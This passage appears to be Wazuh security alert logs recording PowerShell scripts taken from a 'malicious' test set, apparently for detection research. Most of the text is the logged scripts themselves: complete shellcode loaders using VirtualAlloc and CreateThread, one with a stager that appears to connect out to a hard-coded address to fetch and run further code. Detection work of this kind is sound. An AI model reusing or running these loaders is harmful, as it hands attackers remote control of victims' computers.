0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc5,0x1c,0x4d,0x4b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$t8d=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($t8d.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$t8d,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"114754ca-ccd3-4ed7-8f8f-dd5a9ad1be79","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1690.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:18:52.238+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":69,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304332.2267883","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:12.8764011Z","eventRecordID":"144968","processID":"8612","threadID":"5488","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$jdi = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $jdi -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x25,0xe3,0xea,0x37,0xd9,0xc4,0xd9,0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,0x47,0x31,0x43,0x13,0x03,0x43,0x13,0x83,0xc3,0x21,0x01,0x1f,0xcb,0xc1,0x47,0xe0,0x34,0x11,0x28,0x68,0xd1,0x20,0x68,0x0e,0x91,0x12,0x58,0x44,0xf7,0x9e,0x13,0x08,0xec,0x15,0x51,0x85,0x03,0x9e,0xdc,0xf3,0x2a,0x1f,0x4c,0xc7,0x2d,0xa3,0x8f,0x14,0x8e,0x9a,0x5f,0x69,0xcf,0xdb,0x82,0x80,0x9d,0xb4,0xc9,0x37,0x32,0xb1,0x84,0x8b,0xb9,0x89,0x09,0x8c,0x5e,0x59,0x2b,0xbd,0xf0,0xd2,0x72,0x1d,0xf2,0x37,0x0f,0x14,0xec,0x54,0x2a,0xee,0x87,0xae,0xc0,0xf1,0x41,0xff,0x29,0x5d,0xac,0x30,0xd8,0x9f,0xe8,0xf6,0x03,0xea,0x00,0x05,0xb9,0xed,0xd6,0x74,0x65,0x7b,0xcd,0xde,0xee,0xdb,0x29,0xdf,0x23,0xbd,0xba,0xd3,0x88,0xc9,0xe5,0xf7,0x0f,0x1d,0x9e,0x03,0x9b,0xa0,0x71,0x82,0xdf,0x86,0x55,0xcf,0x84,0xa7,0xcc,0xb5,0x6b,0xd7,0x0f,0x16,0xd3,0x7d,0x5b,0xba,0x00,0x0c,0x06,0xd2,0xe5,0x3d,0xb9,0x22,0x62,0x35,0xca,0x10,0x2d,0xed,0x44,0x18,0xa6,0x2b,0x92,0x5f,0x9d,0x8c,0x0c,0x9e,0x1e,0xed,0x05,0x64,0x4a,0xbd,0x3d,0x4d,0xf3,0x56,0xbe,0x72,0x26,0xc2,0xbb,0xe4,0xa0,0x76,0x14,0x90,0x5a,0x7b,0x94,0x40,0x45,0xf2,0x72,0x20,0x29,0x55,0x2b,0x80,0x99,0x15,0x9b,0x68,0xf0,0x99,0xc4,0x88,0xfb,0x73,0x6d,0x22,0x14,0x2a,0xc5,0xda,0x8d,0x77,0x9d,0x7b,0x51,0xa2,0xdb,0xbb,0xd9,0x41,0x1b,0x75,0x2a,0x2f,0x0f,0xe1,0xda,0x7a,0x6d,0xa7,0xe5,0x50,0x18,0x47,0x70,0x5f,0x8b,0x10,0xec,0x5d,0xea,0x56,0xb3,0x9e,0xd9,0xed,0x7a,0x0b,0xa2,0x99,0x82,0xdb,0x22,0x59,0xd5,0xb1,0x22,0x31,0x81,0xe1,0x70,0x24,0xce,0x3f,0xe5,0xf5,0x5b,0xc0,0x5c,0xaa,0xcc,0xa8,0x62,0x95,0x3b,0x77,0x9c,0xf0,0xbd,0x4b,0x4b,0x3c,0xc8,0xa5,0x4f;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$U4S7=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($U4S7.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$U4S7,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: fab703ff-e277-4d6d-8f20-c9586e93636d\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1699.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$jdi = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $jdi -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x25,0xe3,0xea,0x37,0xd9,0xc4,0xd9,0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,0x47,0x31,0x43,0x13,0x03,0x43,0x13,0x83,0xc3,0x21,0x01,0x1f,0xcb,0xc1,0x47,0xe0,0x34,0x11,0x28,0x68,0xd1,0x20,0x68,0x0e,0x91,0x12,0x58,0x44,0xf7,0x9e,0x13,0x08,0xec,0x15,0x51,0x85,0x03,0x9e,0xdc,0xf3,0x2a,0x1f,0x4c,0xc7,0x2d,0xa3,0x8f,0x14,0x8e,0x9a,0x5f,0x69,0xcf,0xdb,0x82,0x80,0x9d,0xb4,0xc9,0x37,0x32,0xb1,0x84,0x8b,0xb9,0x89,0x09,0x8c,0x5e,0x59,0x2b,0xbd,0xf0,0xd2,0x72,0x1d,0xf2,0x37,0x0f,0x14,0xec,0x54,0x2a,0xee,0x87,0xae,0xc0,0xf1,0x41,0xff,0x29,0x5d,0xac,0x30,0xd8,0x9f,0xe8,0xf6,0x03,0xea,0x00,0x05,0xb9,0xed,0xd6,0x74,0x65,0x7b,0xcd,0xde,0xee,0xdb,0x29,0xdf,0x23,0xbd,0xba,0xd3,0x88,0xc9,0xe5,0xf7,0x0f,0x1d,0x9e,0x03,0x9b,0xa0,0x71,0x82,0xdf,0x86,0x55,0xcf,0x84,0xa7,0xcc,0xb5,0x6b,0xd7,0x0f,0x16,0xd3,0x7d,0x5b,0xba,0x00,0x0c,0x06,0xd2,0xe5,0x3d,0xb9,0x22,0x62,0x35,0xca,0x10,0x2d,0xed,0x44,0x18,0xa6,0x2b,0x92,0x5f,0x9d,0x8c,0x0c,0x9e,0x1e,0xed,0x05,0x64,0x4a,0xbd,0x3d,0x4d,0xf3,0x56,0xbe,0x72,0x26,0xc2,0xbb,0xe4,0xa0,0x76,0x14,0x90,0x5a,0x7b,0x94,0x40,0x45,0xf2,0x72,0x20,0x29,0x55,0x2b,0x80,0x99,0x15,0x9b,0x68,0xf0,0x99,0xc4,0x88,0xfb,0x73,0x6d,0x22,0x14,0x2a,0xc5,0xda,0x8d,0x77,0x9d,0x7b,0x51,0xa2,0xdb,0xbb,0xd9,0x41,0x1b,0x75,0x2a,0x2f,0x0f,0xe1,0xda,0x7a,0x6d,0xa7,0xe5,0x50,0x18,0x47,0x70,0x5f,0x8b,0x10,0xec,0x5d,0xea,0x56,0xb3,0x9e,0xd9,0xed,0x7a,0x0b,0xa2,0x99,0x82,0xdb,0x22,0x59,0xd5,0xb1,0x22,0x31,0x81,0xe1,0x70,0x24,0xce,0x3f,0xe5,0xf5,0x5b,0xc0,0x5c,0xaa,0xcc,0xa8,0x62,0x95,0x3b,0x77,0x9c,0xf0,0xbd,0x4b,0x4b,0x3c,0xc8,0xa5,0x4f;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$U4S7=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($U4S7.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$U4S7,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"fab703ff-e277-4d6d-8f20-c9586e93636d","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1699.ps1"}}},"location":"EventChannel"}
